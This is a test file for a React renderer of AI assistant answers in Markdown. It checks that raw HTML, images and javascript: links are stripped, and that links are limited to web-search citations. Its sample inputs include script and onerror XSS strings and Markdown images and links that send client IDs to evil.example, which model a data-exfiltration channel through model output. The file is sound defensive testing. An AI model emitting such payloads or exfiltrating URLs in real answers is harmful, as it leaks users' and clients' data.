/**
 * The AI answer renderer. The text is model output (untrusted), so beyond
 * "Markdown renders" these pin the safety posture: no raw HTML, no images
 * (an external image URL is an exfiltration channel that needs no click).
 */
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"

import { sessionLinkAllowlists } from "@/lib/ai-tools"
import { MarkdownMessage } from "./MarkdownMessage"

const html = (text: string) => renderToStaticMarkup(<MarkdownMessage text={text} />)

describe("MarkdownMessage", () => {
  it("renders bold instead of showing the asterisks", () => {
    const out = html("共触发 **8 次告警（6 位客户）**")
    expect(out).toContain("<strong")
    expect(out).toContain("8 次告警（6 位客户）</strong>")
    expect(out).not.toContain("**")
  })

  it("renders GFM tables and inline code", () => {
    const out = html("| 客户 | 告警 |\n|---|---:|\n| 166916 | 3 |\n\n账户 `5-67042582`")
    expect(out).toContain("<table")
    expect(out).toContain("<td")
    expect(out).toContain("166916")
    expect(out).toContain("<code")
    expect(out).not.toContain("|---|")
  })

  it("never renders raw HTML from the model", () => {
    const out = html('<script>alert(1)</script><img src=x onerror="alert(2)">')
    expect(out).not.toContain("<script")
    expect(out).not.toContain("<img")
  })

  it("never renders images — only their alt text — so nothing is fetched", () => {
    const out = html("![secret](https://evil.example/log?d=client-166916)")
    expect(out).not.toContain("<img")
    expect(out).not.toContain("evil.example")
    expect(out).toContain("[secret]")
  })

  it("opens links in a new tab without referrer and drops javascript: URLs", () => {
    const out = html("[FOMC](https://www.federalreserve.gov/x) [bad](javascript:alert(1))")
    expect(out).toContain('target="_blank"')
    expect(out).toContain("noreferrer")
    expect(out).not.toContain("javascript:")
  })

  describe("once the conversation has searched the web", () => {
    // What the page passes down: this message's entry of sessionLinkAllowlists.
    const allowed = sessionLinkAllowlists([
      {
        tools: [
          {
            key: "search_web#0",
            name: "search_web",
            ok: true,
            certified: false,
            source: { service: "web", function: "search_web", as_of: null, certified: false },
            citations: [{ title: "Fed", url: "https://www.federalreserve.gov/x" }],
          },
        ],
      },
      { tools: [] }, // a follow-up answer that searched nothing
    ])
    const render = (text: string, allowedLinks: string | undefined = allowed[0]) =>
      renderToStaticMarkup(<MarkdownMessage text={text} allowedLinks={allowedLinks} />)

    it("keeps a citation link clickable and downgrades every other link to text", () => {
      const out = render("[Fed](https://www.federalreserve.gov/x) [src](https://evil.example/?d=client-166916)")
      expect(out).toContain('href="https://www.federalreserve.gov/x"')
      expect(out).not.toContain('href="https://evil.example')
      // The URL stays visible as text so the reader sees where it pointed.
      expect(out).toContain("(https://evil.example/?d=client-166916)")
    })

    it("applies the same rule to a later message that made no search of its own", () => {
      const out = render("[Fed](https://www.federalreserve.gov/x) [details](https://evil.example/?d=1)", allowed[1])
      expect(out).toContain('href="https://www.federalreserve.gov/x"')
      expect(out).not.toContain('href="https://evil.example')
    })

    it("shows the hostname next to an allowed link whose text is not the URL", () => {
      expect(render("[official statement](https://www.federalreserve.gov/x)")).toContain("(federalreserve.gov)")
      // Already visible in the text: not repeated.
      const bare = render("https://www.federalreserve.gov/x")
      expect(bare).toContain('href="https://www.federalreserve.gov/x"')
      expect(bare).not.toContain("(federalreserve.gov)")
    })

    it("does not treat a citation URL with an added query string as the citation", () => {
      const out = render("[Fed](https://www.federalreserve.gov/x?d=166916)")
      expect(out).not.toContain("<a ")
    })

    it("downgrades bare autolinks too", () => {
      const out = render("see https://evil.example/a")
      expect(out).not.toContain("<a ")
      expect(out).toContain("https://evil.example/a")
    })

    it("allows nothing while the only search is still running", () => {
      expect(render("[Fed](https://www.federalreserve.gov/x)", "")).not.toContain("<a ")
    })

    it("leaves links alone before the conversation's first search", () => {
      const out = renderToStaticMarkup(<MarkdownMessage text="[x](https://any.example/a)" />)
      expect(out).toContain('href="https://any.example/a"')
      expect(out).not.toContain("(any.example)")
    })
  })
})
